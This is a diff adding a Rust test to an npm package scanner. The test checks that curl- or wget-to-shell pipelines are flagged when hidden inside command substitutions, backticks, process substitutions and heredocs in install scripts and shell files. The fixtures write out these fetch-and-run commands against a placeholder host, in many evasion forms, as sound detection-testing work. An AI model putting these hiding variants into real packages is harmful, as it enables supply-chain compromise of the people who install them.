@@ -1129,6 +1129,109 @@ fn download_pipeline_inside_a_redirected_group_is_a_review_signal() {
     }
 }
 
+/// The core tokenizer keeps a command substitution (`$(...)`, backticks) or a
+/// process substitution inside one word, so a fetch-to-shell pipeline in one
+/// (`x=$(curl URL | sh)`) gave no signal. The descent now looks inside them,
+/// within the same budget, skipping quoted text, comments and heredoc data.
+#[test]
+fn download_pipeline_inside_a_command_substitution_is_a_review_signal() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh";
+    let script_has_signal = |body: &str| {
+        let metadata = serde_json::json!({
+            "name": "fixture",
+            "version": "1",
+            "scripts": { "install": body },
+        })
+        .to_string();
+        inspect(&package(metadata.as_bytes(), &[]))
+            .signals
+            .iter()
+            .any(|signal| {
+                signal.kind == NpmSignalKind::DownloadToShell
+                    && signal.level == NpmSignalLevel::Review
+            })
+    };
+    let flagged = [
+        format!("x=$({pipeline})\n"),
+        format!("echo \"done: $({pipeline})\"\n"),
+        format!("x=`{pipeline}`\n"),
+        format!("y=$(echo $({pipeline}))\n"),
+        format!("x=$(\n  {pipeline}\n)\n"),
+        "f() {\n  v=$(wget -qO- https://example.invalid/setup | bash)\n}\nf\n".to_owned(),
+        format!("x=$(f() {{ {pipeline}; }}; f)\n"),
+        format!("cat <({pipeline})\n"),
+        format!("n=$(( $({pipeline}) + 1 ))\n"),
+        format!("echo ${{X:-$({pipeline})}}\n"),
+        format!("x=\"$(echo \"$({pipeline})\")\"\n"),
+        // `\'` does not close an ANSI-C `$'...'` string.
+        format!("echo $'it\\'s'; x=$({pipeline})\n"),
+        // An apostrophe in a quoted heredoc body is data, not a quote.
+        format!("cat > notes.txt <<'EOF'\ndon't\nEOF\nx=$({pipeline})\n"),
+        // An unquoted heredoc runs its substitutions when it is read.
+        format!("cat <<EOF\nresult: $({pipeline})\nEOF\n"),
+    ];
+    let missed: Vec<&String> = flagged
+        .iter()
+        .filter(|body| !shell_file_has_download_signal(body))
+        .collect();
+    assert!(missed.is_empty(), "shell file: {missed:#?}");
+    let missed: Vec<&String> = flagged
+        .iter()
+        .filter(|body| !script_has_signal(body))
+        .collect();
+    assert!(missed.is_empty(), "lifecycle script: {missed:#?}");
+
+    for body in [
+        format!("echo '$({pipeline})'\n"),
+        format!("# x=$({pipeline})\n"),
+        format!("echo $'$({pipeline})\\''\n"),
+        "x=$(echo curl https://example.invalid/setup | sh)\n".to_owned(),
+        format!("cat >&2 <<'EOF'\nx=$({pipeline})\nEOF\nexit 1\n"),
+        format!("USAGE=$(cat <<'EOF'\nx=$({pipeline})\nEOF\n)\necho \"$USAGE\" >&2\n"),
+    ] {
+        assert!(!shell_file_has_download_signal(&body), "{body:?}");
+    }
+
+    // Substitutions without a pipe cannot hold a pipeline and use no budget.
+    let plain = "x=$(date)\n".repeat(400);
+    let result = inspect(&package(
+        br#"{"name":"fixture","version":"1"}"#,
+        &[("package/install.sh", plain.as_bytes())],
+    ));
+    assert!(
+        !result
+            .coverage
+            .issues
+            .iter()
+            .any(|issue| issue.kind == NpmIssueKind::CodeLimit),
+        "{:?}",
+        result.coverage.issues
+    );
+    assert!(!shell_file_has_download_signal(&plain));
+
+    // Past the budget, coverage is incomplete and the line pass still looks
+    // inside each line's substitutions.
+    let piped = format!("{}y=$({pipeline})\n", "x=$(echo a | tr a b)\n".repeat(300));
+    let result = inspect(&package(
+        br#"{"name":"fixture","version":"1"}"#,
+        &[("package/install.sh", piped.as_bytes())],
+    ));
+    assert!(
+        result
+            .coverage
+            .issues
+            .iter()
+            .any(|issue| issue.kind == NpmIssueKind::CodeLimit),
+        "{:?}",
+        result.coverage.issues
+    );
+    assert!(shell_file_has_download_signal(&piped));
+    // A bound hit by substitutions alone is not a download claim.
+    let piped_only = "x=$(echo a | tr a b)\n".repeat(300);
+    assert!(!shell_file_has_download_signal(&piped_only));
+}
+
 #[test]
 fn credential_network_combination_has_evidence_and_lifecycle_link() {
     let _shared_state = tirith_test_support::SharedStateGuard::acquire();
